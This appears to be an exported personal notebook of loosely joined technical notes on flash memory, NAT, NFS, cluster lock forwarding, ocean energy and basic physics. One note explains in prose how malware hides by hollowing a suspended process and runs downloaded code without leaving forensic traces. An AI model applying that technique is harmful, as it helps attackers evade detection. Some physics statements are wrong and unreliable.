While NOR memory provides an external address bus for read and program operations (and thus supports random-access); unlocking and erasing NOR memory must proceed on a block-by-block basis. With NAND flash memory, read and programming operations must be performed page-at-a-time while unlocking and erasing must happen in block-wise fashion.

!!!!NOR memories

Reading from NOR flash is similar to reading from random-access memory, provided the address and data bus are mapped correctly. Because of this, most microprocessors can use NOR flash memory as execute in place (XIP) memory, meaning that programs stored in NOR flash can be executed directly without the need to first copy the program into RAM. NOR flash may be programmed in a random-access manner similar to reading. Programming changes bits from a logical one to a zero. Bits that are already zero are left unchanged. Erasure must happen a block at a time, and resets all the bits in the erased block back to one. Typical block sizes are 64, 128, or 256 KB.

Bad block management is a relatively new feature in NOR chips. In older NOR devices not supporting bad block management, the software or device driver controlling the memory chip must correct for blocks that wear out, or the device will cease to work reliably.

The specific commands used to lock, unlock, program, or erase NOR memories differ for each manufacturer. To avoid needing unique driver software for every device made, a special set of CFI commands allow the device to identify itself and its critical operating parameters.

Apart from being used as random-access ROM, NOR memories can also be used as storage devices by taking advantage of random-access programming. Some devices offer read-while-write functionality so that code continues to execute even while a program or erase operation is occurring in the background. For sequential data writes, NOR flash chips typically have slow write speeds compared with NAND flash.

!!!!NAND memories
NAND flash architecture was introduced by Toshiba in 1989. These memories are accessed much like block devices such as hard disks or memory cards. Each block consists of a number of pages. The pages are typically 512[6] or 2,048 or 4,096 bytes in size. Associated with each page are a few bytes (typically 12â16 bytes) that should be used for storage of an error detection and correction checksum.

While reading and programming is performed on a page basis, erasure can only be performed on a block basis. Another limitation of NAND flash is data in a block can only be written sequentially.

NAND devices also require bad block management by the device driver software, or by a separate controller chip. SD cards, for example, include controller circuitry to perform bad block management and wear leveling. When a logical block is accessed by high-level software, it is mapped to a physical block by the device driver or controller. A number of blocks on the flash chip may be set aside for storing mapping tables to deal with bad blocks, or the system may simply check each block at power-up to create a bad block map in RAM. The overall memory capacity gradually shrinks as more blocks are marked as bad.

NAND is best suited to systems requiring high capacity data storage. This type of flash architecture offers higher densities and larger capacities at lower cost with faster erase, sequential write, and sequential read speeds, sacrificing the random-access and execute in place advantage of the NOR architecture.

!!!!Distinction between NOR and NAND flash
NOR and NAND flash differ in two important ways:
* the connections of the individual memory cells are different
* the interface provided for reading and writing the memory is different (NOR allows random-access for reading, NAND allows only page access)

It is important to understand that these two are linked by the design choices made in the development of NAND flash. An important goal of NAND flash development was to reduce the chip area required to implement a given capacity of flash memory, and thereby to reduce cost per bit and increase maximum chip capacity so that flash memory could compete with magnetic storage devices like hard disks.

NOR and NAND flash get their names from the structure of the interconnections between memory cells.[11] In NOR flash, cells are connected in parallel to the bit lines, allowing cells to be read and programmed individually. The parallel connection of cells resembles the parallel connection of transistors in a CMOS NOR gate. In NAND flash, cells are connected in series, resembling a NAND gate, and preventing cells from being read and programmed individually: the cells connected in series must be read in series.

When NOR flash was developed, it was envisioned as a more economical and conveniently rewritable ROM than contemporary EPROM, EAROM, and EEPROM memories. Thus random-access reading circuitry was necessary. However, it was expected that NOR flash ROM would be read much more often than written, so the write circuitry included was fairly slow and could only erase in a block-wise fashion; random-access write circuitry would add to the complexity and cost unnecessarily.

Because of the series connection and removal of wordline contacts, a large grid of NAND flash memory cells will occupy perhaps only 60% of the area of equivalent NOR cells. NAND flash's designers realized that the area of a NAND chip, and thus the cost, could be further reduced by removing the external address and data bus circuitry. Instead, external devices could communicate with NAND flash via sequential-accessed command and data registers, which would internally retrieve and output the necessary data. This design choice made random-access of NAND flash memory impossible, but the goal of NAND flash was to replace hard disks, not to replace ROMs.


!!!!Write Endurance
The write endurance of SLC Floating Gate NOR flash is typically equal or greater than that of NAND flash, while MLC NOR &amp; NAND Flash have similar Endurance capabilities. Example Endurance cycle ratings listed in datasheets for NAND and NOR Flash are provided.

* NAND Flash is typically rated at about 100K cycles (Samsung OneNAND KFW4G16Q2M)
* SLC Floating Gate NOR Flash has typical Endurance rating of 100K to 1,000K cycles (Numonyx M58BW 100K; Spansion S29CD016J 1000K)
* MLC Floating Gate NOR has typical Endurance rating of 100K cycles (Numonyx J3 Flash)

!!!!Flash file systems
Because of the particular characteristics of flash memory, it is best used with either a controller to perform wear-levelling and error correction or specifically designed file systems which spread writes over the media and deal with the long erase times of NOR flash blocks. The basic concept behind flash file systems is: When the flash store is to be updated, the file system will write a new copy of the changed data over to a fresh block, remap the file pointers, then erase the old block later when it has time.

Around 1994, the PCMCIA, an industry group, approved the Flash Translation Layer (FTL) specification, which allowed a Linear Flash device to look like a FAT disk, but still have effective wear levelling. Other commercial systems such as FlashFX and FlashFX Pro by Datalight were created to avoid patent concerns with FTL.

ZFS by Sun Microsystems has been optimized to manage Flash SSD systems, both as cache as well as main storage facilities, available for OpenSolaris, FreeBSD, and Mac OS X operating systems. Sun has announced a complete line of Flash enabled systems and storage devices.

JFFS was the first flash-specific file system for Linux, but it was quickly superseded by JFFS2, originally developed for NOR flash.

In practice, flash file systems are only used for &quot;Memory Technology Devices&quot; (&quot;MTD&quot;), which are embedded flash memories that do not have a controller. Removable flash memory cards and USB flash drives have built-in controllers to perform wear-levelling and error correction so use of a specific flash file system does not add any benefit.

!!!!Transfer rates
Commonly advertised is the maximum read speed, NAND flash memory cards are generally faster at reading than writing.

Transferring multiple small files, smaller than the chip specific block size, could lead to much lower rate.

Access latency has an influence on performance but is less of an issue than with their hard drive counterpart.

Sometimes denoted in MB/s (megabyte per second), or in number of &quot;X&quot; like 60x 100x or 150x. &quot;X&quot; speed rating makes reference to the speed at which a legacy audio CD drive would deliver data, 1x is equal to 150 kilobytes per second.

For example, a 100x memory card goes to 150 KB x 100 = 15000 KB per second = 14.65 MB per second.

!!!!Serial flash

Serial flash is a small, low-power flash memory that uses a serial interface, typically SPI, for sequential data access. When incorporated into an embedded system, serial flash requires fewer wires on the PCB than parallel flash memories, since it transmits and receives data one bit at a time. This may permit a reduction in board space, power consumption, and total system cost.

!USB flash drive
There are typically four parts to a flash drive:
* Male type-A USB connector â provides an interface to the host computer.
* USB mass storage controller â implements the USB host controller. The controller contains a small microcontroller with a small amount of on-chip ROM and RAM.
* NAND flash memory chip â stores data. NAND flash is typically also used in digital cameras.
* Crystal oscillator â produces the device's main 12 MHz clock signal and controls the device's data output through a phase-locked loop.

Some file systems are designed to distribute usage over an entire memory device without concentrating usage on any part (e.g., for a directory); this prolongs life of simple flash memory devices. USB flash drives, however, have this functionality built into the controller to prolong device life, and use of such a file system brings less advantage.

Some flash drives retain their memory after being submerged in water [19], even through a machine wash, although this is not a design feature and not to be relied upon. Leaving the flash drive out to dry completely before allowing current to run through it has been known to result in a working drive with no future problems. Channel Five's Gadget Show cooked a flash drive with propane, froze it with dry ice, submerged it in various acidic liquids, ran over it with a jeep and fired it against a wall with a mortar. A company specializing in recovering lost data from computer drives managed to recover all the data on the drive. [20] All data on the other removal storage devices tested, using optical or magnetic technologies, were destroyed.

!SSD Solid-state devices
A solid-state drive (SSD) is a data storage device that uses solid-state memory to store persistent data.

!!!Flash-based
Most SSD manufacturers use non-volatile flash memory to create more rugged and compact devices for the consumer market. These flash memory-based SSDs, also known as flash drives, do not require batteries. They are often packaged in standard disk drive form factors (1.8-inch, 2.5-inch, and 3.5-inch). In addition, non-volatility allows flash SSDs to retain memory even during sudden power outages, ensuring data persistence. Up to the fall of 2008 flash SSDs were significantly slower than DRAM (and even traditional HDDs on big files), but still perform better than traditional hard drives (at least with regard to reads) because of negligible seek time (flash SSDs have no moving parts, and thus eliminate spin-up time, and greatly reduce seek time, latency, and other delays inherent in conventional electro-mechanical disks).

Micron/Intel SSD made faster flash drives by implementing data striping (similar to RAID0) and interleaving. This allowed creation of ultra-fast SSDs with 250 MB/s effective read/write - the maximum SATA interface can really manage.[4]

!!!DRAM based
SSDs based on volatile memory such as DRAM are characterized by ultra fast data access, generally less than 0.01 milliseconds, and are used primarily to accelerate applications that would otherwise be held back by the latency of Flash SDDs or traditional HDDs. DRAM-based SSDs usually incorporate internal battery and backup storage systems to ensure data persistence while no power is being supplied to the drive from external sources. If power is lost, the battery provides power while all data is copied from random access memory (RAM) to back-up storage, or to allow the data's transfer to another computer.

These types of SSD are usually fitted with the same type of DRAM modules used in regular PC's and servers, allowing them to be swapped out and replaced with larger modules.

A secondary computer with a fast network connection can be used as a RAM-based SSD.[7]

<pre>Moebuis Band is a surface with only one side and only one boundary component. It has the mathematical property of being non-orientable. It is also a ruled surface. It was discovered independently by the German mathematicians August Ferdinand Möbius and Johann Benedict Listing in 1858.

A model can easily be created by taking a paper strip and giving it a half-twist, and then joining the ends of the strip together to form a single strip. In Euclidean space there are in fact two types of Moebius strips depending on the direction of the half-twist: clockwise and counterclockwise. The Moebius strip is therefore chiral, which is to say that it has ''handedness'' (as in right-handed or left-handed).

It is straightforward to find algebraic equations the solutions of which have the topology of a Möbius strip, but in general these equations do not describe the same geometric shape that one gets from the twisted paper model described above. In particular, the twisted paper model is a developable surface (it has zero Gaussian curvature). A system of differential-algebraic equations that describes models of this type was published in 2007 together with its numerical solution.

The Euler characteristic of the Moebius strip is zero.

<pre>!NAT
network address translation (NAT) is the process of modifying network address information in datagram packet headers while in transit across a traffic routing device for the purpose of remapping a given address space into another.

Most often today, NAT is used in conjunction with network masquerading (or IP masquerading) which is a technique that hides an entire address space, usually consisting of private network addresses (RFC 1918), behind a single IP address in another, often public address space.

This mechanism is implemented in a routing device that uses stateful translation tables to map the &quot;hidden&quot; addresses into a single address and then rewrites the outgoing Internet Protocol (IP) packets on exit so that they appear to originate from the router. In the reverse communications path, responses are mapped back to the originating IP address using the rules (&quot;state&quot;) stored in the translation tables. The translation table rules established in this fashion are flushed after a short period without new traffic refreshing their state.

&quot;static NAT&quot; or port forwarding and allows traffic originating in the 'outside' network to reach designated hosts in the masqueraded network.

Network address translation involves re-writing the source and/or destination IP addresses and usually also the TCP/UDP port numbers of IP packets as they pass through the NAT. Checksums (both IP and TCP/UDP) must also be rewritten to take account of the changes.

!!!Working
In a typical configuration, a local network uses one of the designated &quot;private&quot; IP address subnets (the RFC 1918 Private Network Addresses are 192.168.x.x, 172.16.x.x through 172.31.x.x, and 10.x.x.x (or using CIDR notation, 192.168/16, 172.16/12, and 10/8), and a router on that network has a private address (such as 192.168.0.1) in that address space. The router is also connected to the Internet with a single &quot;public&quot; address (known as &quot;overloaded&quot; NAT) or multiple &quot;public&quot; addresses assigned by an ISP. As traffic passes from the local network to the Internet, the source address in each packet is translated on the fly from the private addresses to the public address(es). The router tracks basic data about each active connection (particularly the destination address and port). When a reply returns to the router, it uses the connection tracking data it stored during the outbound phase to determine where on the internal network to forward the reply; the TCP or UDP client port numbers are used to demultiplex the packets in the case of overloaded NAT, or IP address and port number when multiple public addresses are available, on packet return. To a system on the Internet, the router itself appears to be the source/destination for this traffic.

NAT which involves translation of the source IP address and/or source port is called source NAT or SNAT. This re-writes the IP address and/or port number of the computer which originated the packet.
NAT which involves translation of the destination IP address and/or destination port number is called destination NAT or DNAT. This re-writes the IP address and/or port number corresponding to the destination computer.
SNAT and DNAT may be applied simultaneously to internet packets.

!Types of NAT
!!!Full cone NAT
Once an internal address (iAddr:port1) is mapped to an external address (eAddr:port2), any packets from iAddr:port1 will be sent through eAddr:port2. Any external host can send packets to iAddr:port1 by sending packets to eAddr:port2.
[img[images/full.cone.nat.png]]

!!!Restricted cone NAT
Once an internal address (iAddr:port1) is mapped to an external address (eAddr:port2), any packets from iAddr:port1 will be sent through eAddr:port2. An external host (hostAddr:any) can send packets to iAddr:port1 by sending packets to eAddr:port2 only if iAddr:port1 had previously sent a packet to hostAddr:any. &quot;any&quot; means the port number doesn't matter.
[img[images/restricted.cone.nat.png]]

!!!Port restricted cone NAT
Like a restricted cone NAT, but the restriction includes port numbers.
Once an internal address (iAddr:port1) is mapped to an external address (eAddr:port2), any packets from iAddr:port1 will be sent through eAddr:port2. An external host (hostAddr:port3) can send packets to iAddr:port1 by sending packets to eAddr:port2 only if iAddr:port1 had previously sent a packet to hostAddr:port3.
[img[images/port.restricted.cone.nat.png]]

!!!symmetric NAT.
Each request from the same internal IP address and port to a specific destination IP address and port is mapped to a unique external source IP address and port. 
* If the same internal host sends a packet even with the same source address and port but to a different destination, a different mapping is used.
Only an external host that receives a packet from an internal host can send a packet back.
[img[images/symmetric.nat.png]]

!NAT and TCP/UDP
The major transport layer protocols, TCP and UDP, have a checksum that covers all the data they carry, as well as the TCP/UDP header, plus a &quot;pseudo-header&quot; that contains the source and destination IP addresses of the packet carrying the TCP/UDP header. For an originating NAT to successfully pass TCP or UDP, it must recompute the TCP/UDP header checksum based on the translated IP addresses, not the original ones, and put that checksum into the TCP/UDP header of the first packet of the fragmented set of packets. The receiving NAT must recompute the IP checksum on every packet it passes to the destination host, and also recognize and recompute the TCP/UDP header using the retranslated addresses and pseudo-header. This is not a completely solved problem. One solution is for the receiving NAT to reassemble the entire segment and then recompute a checksum calculated across all packets.

!NAT Traversal
NAT traversal is a general term for techniques that establish and maintain TCP/IP network connections traversing network address translation (NAT) gateways.

NAT traversal techniques are typically required for client-to-client networking applications, especially peer-to-peer and Voice-over-IP (VoIP) deployments. Many techniques exist, but no single method works in every situation since NAT behavior is not standardized. Many techniques require assistance from a computer server at a publicly-routable IP address. Some methods use the server only when establishing the connection (such as STUN), while others are based on relaying all data through it (such as TURN), which adds bandwidth costs and increases latency, detrimental to real-time voice and video communications.

In order for IPsec to work through a NAT, the following protocols need to be allowed on the firewall:
* Internet Key Exchange (IKE) - User Datagram Protocol (UDP) port 500
* Encapsulating Security Payload (ESP) - Internet Protocol (IP) 50
or, in case of NAT-T:
* IPsec NAT-T - UDP port 4500
Often this is accomplished on home routers by enabling &quot;IPsec Passthrough&quot;.

!UDP Hole Punching
NAT traversal through UDP hole punching is a method for establishing bidirectional UDP connections between Internet hosts in private networks using NAT. It does not work with all types of NATs as their behavior is not standardized.

The basic idea is to have each host behind the NAT contact a third well-known server (usually a STUN server) in the public address space and then, once the NAT devices have established UDP state information, to switch to direct communication hoping that the NAT devices will keep the states despite the fact that packets are coming from a different host.

UDP hole punching will not work with a Symmetric NAT (also known as bi-directional NAT) which tend to be found inside large corporate networks. With Symmetric NAT, the IP address of the well known server is different from that of the endpoint, and therefore the NAT mapping the well known server sees is different from the mapping that the endpoint would use to send packets through to the client. For details on the different types of NAT, see network address translation.

The technique is widely used in P2P software and VoIP telephony. It is one of the methods used in Skype to bypass firewalls and NAT devices. It can also be used to establish VPNs (using, e.g., OpenVPN, strongSwan).

!!!!Algorithm
Let A and B be the two hosts, each in its own private network; N1 and N2 are the two NAT devices; S is a public server with a well-known globally reachable IP address.
* A and B each begin a UDP conversation with S; the NAT devices N1 and N2 create UDP translation states and assign temporary external port numbers
* S relays these port numbers back to A and B

!STUN
Simple Traversal of User Datagram Protocol through Network Address Translators (NATs) (abbreviated STUN), is a standards-based IP protocol used as one of the methods of NAT traversal in applications of real-time voice, video, messaging, and other interactive IP communications. The original specification in RFC 3489 has been obsoleted by newer methods published as RFC 5389 with the title Session Traversal Utilities for NAT.

The protocol allows applications operating through a NAT to discover the presence and specific type of NAT, and obtain the mapped (public) IP address (NAT address) and port number that the NAT has allocated for the application's User Datagram Protocol (UDP) connections to remote hosts. The protocol requires assistance from a 3rd-party network server (STUN server) located on the opposing public site of the NAT, usually the public Internet.

The client, operating inside the NAT masqueraded network, initiates a short sequence of requests to a STUN protocol server listening at two IP addresses in the network on the public side of the NAT, traversing the NAT. The server responds with the results, which are the mapped IP address and port on the 'outside' of the NAT for each request to its two listeners. From the results of several different types of requests, the client application can learn the operating method of the network address translator, including the live-time of the NAT's port bindings.

The standard STUN server listening port is 3478.

Once a client has discovered its external addresses, it can communicate with its peers. If the NAT is the full cone type then either side can initiate communication. If it is restricted cone or restricted port cone type both sides must start transmitting together.

!NAT Usage
NAT is the technique of rewriting addresses on a packet as it passes through a routing device.

DNAT translates the address on an inbound packet and creates an entry in the connection tracking state table.
NAT always transforms the layer 3 contents of a packet. Port redirection operates at layer 4.

*server NAT IP, NAT IP
**The IP address to which packets are addressed. This is the address on the packet before the device performing NAT manipulates it. This is frequently also described as the public IP, although any given application of NAT knows no distinction between public and private address ranges. 
*real IP, server IP, hidden IP, private IP, internal IP
**The IP address after the NAT device has performed its transformation. Frequently, this is described as the private IP, although any given application of NAT knows no distinction between public and private address ranges. 
*client IP
**The source address of the initial packet. The client IP in a NAT transformation does not change; this IP is the source IP address on any inbound packets both before and after the translation. It is also the destination address on the outbound packet. 

!Stateless NAT with iproute2

It involves rewriting addresses passing through a routing device: inbound packets will undergo destination address rewriting and outbound packets will undergo source address rewriting. Creating an iproute2 NAT mapping has the side effect of causing the kernel to answer ARP requests for the NAT IP. The nat entry in the local routing table causes the kernel to reply for ARP requests to the NAT IP.

NAT with iproute2 can be used in conjunction with the routing policy database (cf. RPDB) to support conditional NAT, e.g. only perform NAT if the source IP falls within a certain range.

# The next line is the &quot;same&quot; packet leaving eth0, masq-gw's inside interface, bound for the internal network. The NAT code has substituted the real IP of the server, 192.168.100.17. This rewriting is handled by the nat entry in the local routing table (ip route). 
# The SMTP server then sends a return packet which arrives on eth0. This is the packet before the NAT code on masq-gw has rewritten the outbound packet. This rewriting is handled by the RPDB entry (ip rule). 
# Finally, the return packet is transmitted on eth1 after having been rewritten. The source IP address on the packet is now the public IP on which the service is published.

The parameter via tells the NAT code to rewrite the packet bound for 205.254.211.17 with the new destination address 192.168.100.17. Note, that this only handles inbound packets; that is, packets whose destination address contains 205.254.211.17.
# This command enters the corresponding rule for the outbound traffic into the RPDB (kernel 2.2 and up). This rule will cause the kernel rewrite any packet from 192.168.100.17 with the specified source address (205.254.211.17). Any packet originating from 192.168.100.17 which passes through this router will trigger this rule. In short, this command rewrites the source address of outbound packets so that they appear to originate from the NAT IP.
# The kernel maintains a routing cache to handle routing decisions more quickly. After making changes to the routing tables on a system, it is good practice to empty the routing cache with ip route flush cache. Once the cache is empty, the kernel is guaranteed to consult the routing tables again instead of the routing cache.
# These two commands allow the user to inspect the routing policy database and the local routing table to determine if the NAT routes and rules were added correctly.

!Differences Between SNAT and Masquerading

Though SNAT and masquerading perform the same fundamental function, mapping one address space into another one, the details differ slighly. Most noticeably, masquerading chooses the source IP address for the outbound packet from the IP bound to the interface through which the packet will exit.

<pre>!NFS Stale handle errors

Possible Causes

!!! A file or directory that was opened by NFS client is removed, renamed or replaced. To reproduce this issue 

{{{
On client 1 :
dd if=/dev/zero of=/mnt/nfs_fs/a/outfile count=256 bs=1024K 
On client 2 :
rm /mnt/nfs_fs/a/outfile 
}}}

remove the outfile from another client while the file is being accessed from the first client. Sometimes the error could be 'input/output error' returned by dd. Verify the actual error returned by capturing ethereal traces for NFS. 

!!! FS id([[fsid]] has changed

* Could happen if the underlying FS has changed its fsid, because either it was unmounted or a different fs is mounted at the same place. 
* IP failover happened to another node, and CFS is not mounted on that node

!!! How to get out stale handle state

Depending on how you have reached the state, you need to follow different steps to get out. 
# If the file was removed or deleted, doing 'ls' would cause a new getattr request and that shoudl refresh the client cache.
# If the fsid has changed, then from the client you will have remount the fs

!!!gzip complains with Broken pipe
{{{
gunzip &lt; file.tar.gz | tar xvf -
gunzip &lt; file.tgz    | tar xvf -
}}}

If you use the commands described above to extract a tar.gz file, gzip sometimes emits a Broken pipe error message. This can safely be ignored if tar extracted all files without any other error message.

The reason for this error message is that tar stops reading at the logical end of the tar file (a block of zeroes) which is not always the same as its physical end. gzip then is no longer able to write the rest of the tar file into the pipe which has been closed.

This problem occurs only with some shells, mainly bash. These shells report the SIGPIPE signal to the user, but most others (such as tcsh) silently ignore the pipe error.

You can easily reproduce the same error message with programs other than gzip and tar, for example:

{{{
  cat /dev/zero | dd bs=1 count=1
}}}

!NFS inode limit
NFS handles have 32-bit inode number, where as filesystems would have 64-bit inodes. Which means any files with inode number greater than 2^32 cannot be used. 2^32 is a lot of files, 4-billion files, which we are unlikely to touch and since inode numbers are reused it is not a problem.

<pre>consists of a client-server directory service protocol for distributing system configuration data such as user and host names between computers on a computer network.

NIS and NIS+ are only similar in their purpose and name; otherwise, they have completely different implementations. NIS+ differs from NIS in the following ways:

    * NIS+ is hierarchical.
    * NIS+ is based around Secure RPC (servers must authenticate clients and vice-versa).
    * NIS+ may be replicated (replicas are read-only).
    * NIS+ implements permissions on directories, tables, columns and rows.
    * NIS+ also implements permissions on operations, such as being able to use nisping to transfer changed data from a master to a replication

The information accessed in NIS is housed in files called maps. In addition to the central master server, where all maps are maintained, and the clients that access them, slave servers exist. These slaves can handle client requests for map access, but no changes to the maps are made on the slaves. Changes are made only at the master server, and then distributed through the master (see Figure 2).

{{{

NFS utilizes the AUTH_UNIX method of authentication, which implicitly trusts the UID (user ID) and GIDs (group ID) that the NFS client presents to the server. Root access to a file system explicitly exported by root can also be easily compromised if an intruder can gain root access. Further, programs can easily be developed that set the UID and GID value to any given number. This allows access to any user's file on an NFS server. [1] At times, the NFS daemons have also been known to be vulnerable to buffer overflows

use Yast to configure NIS server.
If you want to refresh data from /etc/netgroup to NIS server, restart using Yast.

<pre>!NLMGroup

This VCS group defines the NLM master server. The node on which this group is online is considered the NLM lock master and it will accept lock requests from other nodes in the cluster.

This group has two resources

# nlmmasterIP
# nlmmasterNIC 

nlmmaterNIC defines the NIC on which forwarding would take place. The device that is used as per current design is 'priveth0'. If there is only one private device, then that same device will be used as high priority LLT device, NLM forwarding device and ssh traffic device.

nlmmasterIP resource defines the IP on which requests are to be received. This IP will always have suffix '.2' chosen from the subnet on that device.

!!NLMGroup postonline

When this group comes online on any node, then

# remove self iptables rules if any
# restart NFS service in grace period mode
# sm-notify clients of restart of NFS
# Reset existing NAT connections
# We go to other nodes and make sure that iptables rules are added on those nodes. 

In step 3, we manually remove the files in /var/lib/nfs/sm as /var/lib/nfs/sm is a filesystem and sm-notify will try to rename those files into /var/lib/nfs/sm.bak which will fail as they are part of different filesytems.

In step 3, we also add an entry into /etc/hosts for the nlmmonitorname which is the name used by server to tell clients of nfs server restart as 0.0.0.0. By default when we call sm-notify, with that name it will lookup the name to an ip and will try to send the packets from that ip. When we have multiple subnets, we could be getting any ip and we may or may not be able to send packets to the clients from the lookedup ip for nlmmonitorname. So, in this case the lookup will return 0.0.0.0 causing the bind to fail, and the source ip will be decided by the routing table.

<pre>!!!NLM Connection Reset on Source
Previouly when a node was NLM master it could be having connections to clients, which cannot be NATed by the new iptables rules, hence would require to be reset. We use sfs_tcp_reset from TCPUtils to reset those existing connections.

!!!NLM Connection Reset on Dest (NAT reset)
Before becoming NLM master the node could have been NLM slave, and could have been having forwarding rules. If there are existing NATed connections to a node, before the node became NLM master then iptables -t nat -F will only be effective for new connections, already existing NAT connections would still continue to be NATed. For resetting those NATed connections, we use sfs_tcp_reset_ether utility from TCPUtils to reset existing NAT connections, which send ethernet level packets to do a TCP reset. We can't use sfs_tcp_reset to send ip level packets, as they would undergo NAT and won't reach the client correctly. There are some limitations to sfs_tcp_reset_ether in that it will only try to guess the sequence number only once. In this case if the reset fails, then after some time the connection would automatically get reset by TCP retries, and lock requests would recover. The list of these existing NATed connections are picked up from /proc/net/ip_conntrack.</pre>

<pre>!Problem
In NLM we forward requests from slave to master, these requests from the slave private ip to the master. The RPC layer at the master makes verification whether the client has enough permissions for this operation or not. Unfortunately this check is done based on the ip in the incoming packet and not the HOST field in the NLM payload. Below describes the scenario where the forwarded request is denied by the RPC layter, because the client (nasgw12_02) does not have access to the filesystem on which it has forwarded the lock request.

This problem would not happen if the share were exported to '*' as the client nasgw12_02 would also come under this list and lock requests would be accepted by nasgw12_01. Ethereal will not tell directly that the reply contains rejected reply, only looking at the full packet trace using wireshark would tell that the reply contains AUTH_ERROR with bad credential (seal broken). With linux client it would try a couple of times, other clients may not. On the client from the tool which is being used to acquire the lock, you should permission denied error.

!!Internal NFS shares
To avoid the problem described we create internal nfs shares for all the filesystem exported using NFS to all hosts in the cluster. We do this by exporting all those filesystems to the private ip subnet that is present on priveth0. These internal shares are created when a filesystem is shared first and deleted when the last share for that filesystem is deleted. Internal shares are created with name ishare and behave the same way as other shares, they are restricted from being visible from clish.

{{{
Share ishare_100 (
                PathName = &quot;/vx/fs_mirr&quot;
                Client = &quot;172.26.114.81/24&quot;
                Options = &quot;rw,no_root_squash&quot;
                )
}}}

The internal shares are always exported with the options rw,no_root_squash. This does not creates problems even if the actual shares are exported as read-only, even if we have added permissions for NLM clients to take rw locks, the lock request would pass the RPC layer but get denied at the NLM layer which will use the HOST name filed in the NLM payload. Based on similar testing no problems were observed with no_root_squash even if the original shares were exported as root_squash. </pre>

<pre>!Nebbett's Shuttle

This technique was windows specific and utilises the win32 api as well as internal windows functions to accomplish its purpose. The essence of Nebbett's approach was to launch a process in suspended state. Once in suspeneded state its process memory could be manipulated and overwritten with a new executable. Execuiton of this process is then resumed. 

Covertly laucning an executable using Nebbett's Shuttle allows the malicious process to appear as process which it was started as. For example, if one were to use this technique with notepad.exe bein g the process which is started in a suspended state, then overwritten with sol.exe, a game of solitaire would be presented to the user. When the user views their task manager it will appear as though the notepad program is running. 

A malware launcher can be crafter which downloads a program from the internet and executes it without leaving any disk residue of this action taking place. With no disk residue a forensic examiner will also be unable to capture the malicious binary for reverse engineering. 

A program which uses debugger techniques will launch or attach to a process. If the process is launched by the debugger then a breakpoint will be placed at any entry point. Otherwise, if the debugger attaches to a running process then a breakpoint is placed at the currently executing instruction. When the breakpoint is triggered, control flow of the program belongs to the debugger. The first step taken against the suspended process is to inject a small piece of shellcode at the currently executing memory location whose purpose it is to allocate a small buffer outside of the locaiton occupied by the executables memory image. The final instruction in this shellcode will be a software interrupt (int 3). When the interrupt instruction is executed control will return to the debugger. 

The next action performed by the debugger is the injection of a second piece of shellcode. This time the shellcode is inserted into the memory buffer which was just created by the first piece of shellocde. The job of second piece of shellcode is first to unmap the executable image from memory. The reason for this is so that we can place our new executable in its favored location and eliminate some compatibility issues associated with this form of injection. Next the shellcode allocates the amount of memory needed to contain the new executable memory image. It then grows the heap if needed, according to what is required by the new executable. Once again, the final instruction in the shellcode is the sofware interrupt instruction.

After control returns to the debugger it must populate the target process' memory with the new executable image. It will also populate the stack with the appropriate data for the new process and set registers to the values appropriate for a new process. At this point the debugging process may detach itself from the target if necessary as execution is resumed on manipulated process.

A protable mechanism exists for performing debugging operations on most UNIX variants. This interface, the ptrace() system call, provides capablities to attach to a remote process, debug a child process, read and write process memory, manipulate registers and alter signal handlers in the target process. Using the approach of the ptrace() system call to manipulate processes it is possible to achieve other process injection techniques beyond what we have just discussed.

<div title="Ocean Energy" modifier="YourName" created="200811211752" changecount="1">
<pre>Ocean thermal energy conversion (OTEC) is a method for generating electricity which uses the temperature difference that exists between deep and shallow waters to run a heat engine. As with any heat engine, the greatest efficiency and power is produced with the largest temperature difference.

The temperature difference generally increases with decreasing latitude, i.e. near the equator, in the tropics. However, evaporation prevents the surface temperature from exceeding 27 deg.C (80 deg.F). Also the subsurface water rarely falls below 5 deg.C

The total energy available is one or two orders of magnitude higher than other ocean energy options such as wave power, but the small magnitude of the temperature difference makes energy extraction comparatively difficult and expensive, due to low thermal efficiency. Earlier OTEC systems had an overall efficiency of only 1 to 3% (the theoretical maximum efficiency lies between 6 and 7%.

A heat engine is a thermodynamic device placed between a high temperature reservoir and a low temperature reservoir. As heat flows from one to the other, the engine converts some of the heat energy to work energy. This principle is used in steam turbines and internal combustion engines, while refrigerators reverse the direction of flow of both the heat and work energy. Rather than using heat energy from the burning of fuel, OTEC power draws on temperature differences caused by the sun's warming of the ocean surface.

OTEC could produce gigawatts of electrical power. Managing costs is still a huge challenge, however. All OTEC plants require an expensive, large diameter intake pipe, which is submerged a kilometre or more into the ocean's depths, to bring very cold water to the surface.

To operate, the cold seawater must be brought to the surface. This can be accomplished through direct pumping. A second method is to desalinate the seawater near the sea floor; this lowers its density, which will cause it to &quot;float&quot; up through a pipe to the surface.

Depending on the location
* Land based plant
* Shelf based plant
* Floating plant

Depending on the cycle used
* Open cycle
* Closed cycle
* Hybrid cycle

!!!Closed-cycle
Closed-cycle systems use fluid with a low boiling point, such as ammonia, to rotate a turbine to generate electricity. Warm surface seawater is pumped through a heat exchanger where the low-boiling-point fluid is vaporized. The expanding vapor turns the turbo-generator. Then, cold, deep seawaterâpumped through a second heat exchangerâcondenses the vapor back into a liquid, which is then recycled through the system.

[img[images/closed.cycle.ocean.gif]]

!!!Open-cycle
Open-cycle OTEC uses the tropical oceans' warm surface water to make electricity. When warm seawater is placed in a low-pressure container, it boils. The expanding steam drives a low-pressure turbine attached to an electrical generator. The steam, which has left its salt and contaminants behind in the low-pressure container, is pure fresh water. It is condensed back into a liquid by exposure to cold temperatures from deep-ocean water. This method has the advantage of producing desalinized fresh water, suitable for drinking water or irrigation.

!!!Hybrid
A hybrid cycle combines the features of both the closed-cycle and open-cycle systems. In a hybrid OTEC system, warm seawater enters a vacuum chamber where it is flash-evaporated into steam, similar to the open-cycle evaporation process. The steam vaporizes the ammonia working fluid of a closed-cycle loop on the other side of an ammonia vaporizer. The vaporized fluid then drives a turbine to produce electricity. The steam condenses within the heat exchanger and provides desalinated water.

<pre>!Classical idea of physics
Clasical ideas define gravity and other things. These laws hold in the world with objects of bigger size. With tiny objects such as electrons the classical laws of physics fail.

* ''Mass is Conserved'': E = mc^^2^^.  So mass can be created or destroyed if equivalent energy is created or destroyed. 
* ''Gravity'': Newton simply thought that gravity was another force and that two masses have some mysterious force pulling them together. Einstein thought otherwise; he believed that mass curves the space arround it and because of this curvature in space, objects are &quot;attracted&quot; to each other.

!Initial theory of Particle Physics
All objects are made of fundamental constiuents electrons, protons and neutrons. All atoms area of the same size, but nucleus are of different size. Atoms cannot be seen by eye, because the the size of atoms is less than wavelength of light.
Also called ''high energy physics''

!Leptons
